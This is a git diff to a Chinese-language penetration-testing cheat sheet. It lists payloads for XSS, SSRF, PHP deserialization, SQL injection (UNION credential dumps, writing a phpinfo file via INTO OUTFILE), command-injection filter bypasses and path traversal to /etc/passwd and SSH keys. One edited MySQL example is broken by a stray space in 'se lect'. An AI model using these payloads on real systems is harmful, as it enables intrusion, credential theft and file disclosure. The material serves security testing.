@@ -8,6 +8,15 @@
 - SHA256: 32字节256bit, 64个十六进制字符
 
 
+## 常用编码
+
+- 十六进制: `0x2f = /`
+- URL: `%20`空格, `%2c`英文逗号
+- ASCII:
+- 反转义：`\t`TAB制表符，`\r`回车CR，`\n`换行LF
+- html: `&lsquo;`中文左单引号，`&rsquo;`中文右单引号，`&rdquo;`中文右双引号
+
+
 ## XSS
 
 1. 尝试使用`xss"><img src=x onerror=alert(3)>`
@@ -147,6 +156,13 @@ if(token != null && token.equals(req_token)) {
 
 
 ## SSRF
+
+### 验证步骤
+
+- 请求参数中携带endpoint
+- 请求头中携带X-Endpoint
+
+### 场景危害
 
 > 所有场景都可攻击 **内网** 或 **本地**
 
@@ -300,7 +316,6 @@ if(token != null && token.equals(req_token)) {
 ## 反序列化
 
 ```php
-<?php
 // 定义类
 class Cl{
     var $test = "hello";
@@ -330,7 +345,6 @@ $sc = 'O:2:"Cl":2:{s:4:"test";s:13:"system(\'id\');";s:3:"age";i:3;}';
 $uc = unserialize($sc);
 // hello
 print_r($uc->test);
-?>
 ```
 
 ## SQL注入
@@ -348,15 +362,24 @@ print_r($uc->test);
 
 ### 常用POC
 
-- 查询全部数据`flag' or 1=1 #`或`flag' or 1=1 -- `
+- 查询 **当前表** 中全部数据`flag' or 1=1 #`或`flag' or 1=1 -- `
 - 猜解列数`flag' union select 1,2,3 #`, 返回的数据为1, 2, 3
-- 猜解数据库名, 表名`flag' and exist(select * from xxx) #`或`' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`, 使用`and 0`先将干扰数据清零, 再查询`INFORMATION_SCHEMA`库中的`COLUMNS`表获取数据库名和表名
-- 猜解列名, 数据类型`flag' and exist(select xxx from xxx) #`或`' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx'#`
+- 猜解数据库名, 表名
+    - `flag' and exist(select * from xxx) #`
+    - `' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #`
+
+        > 使用`and 0`先将干扰数据清零, 再查询`INFORMATION_SCHEMA`库中的`COLUMNS`表获取数据库名和表名
+
+- 猜解列名, 数据类型
+    - `flag' and exist(select xxx from xxx) #`
+    - `' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='xxx' #`
+
+- 查询某个表中某个数据: `' UNION SELECT 0, 'NULL', (SELECT USERNAME||' '||PASSWORD FROM DATABASENAME.TABLENAME LIMIT 1), 'NULL' --+-`
 - 写入文件: `select "hackkkk" into outfile "/tmp/hackkkk.jsp";`
 - 在文件开头写入内容:
 
     ```bash
-    mysql> select "hackkkk" into outfile "/tmp/hackkk.jsp" LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e;
+    mysql> se lect "hackkkk" into outfile "/tmp/hackkk.jsp" LINES STARTING BY 0x3c3f70687020706870696e666f28293b3f3e;
     Query OK, 1 row affected (0.02 sec)
     mysql> quit
     Bye
@@ -530,15 +553,26 @@ public interface UserMapper {
 
 ## 命令注入
 
+### 常见场景
+
+1. 输入帐号 **口令** 测试SVN/git连通性
+1. **NTP** 服务器校时
+1. 上传解析 **文件名**
+1. **文件路径**
+
 ### 验证步骤
 
 1. 使用`;`, `|`或`&&`直接进行命令拼接
+1. 使用`\n`拼接
 1. 使用`` USERID=`id -u` ``或`USERID=$(uname -a)`进行命令替换
 1. 如果遇到特殊字符校验
 
     !!! tip "33种特殊字符`` `~!@#$%^&*()-_=+\|[{}];:'",<.>/?和空格 ``"
 
-    1. `/`: 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
+    1. `/`:
+        1. 在环境中截取, 如当前路径: `xxx;cc=$(pwd);ff=${cc:0:1};mkdir $(ff)tmp$(ff)hackfile;`
+        1. 调用python库函数: `x;python${IFS}-c${IFS}\"getattr(__import__('os'),'system')('touch\"'${IFS}'\"'+chr(0x2f)+'tmp'+chr(0x2f)+'hackfile')\";1.tar.gz`
+
     1. 空格: 使用特殊变量替换: `$ a=$(curl$IFS"http://10.74.201.219:8888/")`
     1. `;`: 使用十六进制替换: `a=$'\x3b'; echo $a`, 这种方式会被当做字符串来执行
 
@@ -703,7 +737,9 @@ public class OSi {
 
 ### 验证步骤
 
-1. 文件名或路径可控, 在路径中添加`../`, 下载敏感文件如`/etc/passwd`
+1. 文件名或路径可控
+    - 在路径中添加`../`, 下载敏感文件如`/etc/passwd`
+    - `/rest/v1/file/..--..--home--xxx--.ssh--id_rsa`
 1. 如果文件路径在URL中, 需要进行URL编码`%2e%2e%2f`
 
 
